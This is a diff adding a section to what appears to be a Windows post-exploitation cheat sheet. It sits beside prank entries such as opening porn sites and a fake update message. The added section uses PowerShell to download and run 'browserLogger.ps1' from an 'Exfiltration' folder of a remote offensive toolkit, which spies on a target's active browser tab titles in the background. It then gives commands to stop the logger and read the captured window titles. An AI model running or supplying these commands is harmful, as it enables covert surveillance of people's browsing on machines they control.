@@ -120,6 +120,21 @@ echo "Carrega no [F11] no teclado para abortar o update." > ola.txt;start ola.tx
 
 ## Open porn websites
 Start https://youporn.com
+
+
+### spying target webbrowser active tab windows title
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/browserLogger.ps1" -OutFile "browserLogger.ps1"
+powershell -file BrowserLogger.ps1 -force 'true' -log
+
+# Manual stop browserLogger process thats running in background
+$PPID = (Get-Content -Path "$pwd\Browser.report"|Select-String -Pattern '\s*Process Id+\s*:+\s') -replace '\s*Process Id+\s*:+\s',''
+Stop-Process -Id "$PPID" -Force
+
+# Manual read logfile entrys
+Get-Content -Path "Browser.report"
+
+# OR get only the windows title strings
+Get-Content -Path "Browser.report"|Select-String -Pattern 'Windows Title   :'
 ```
 
 ---
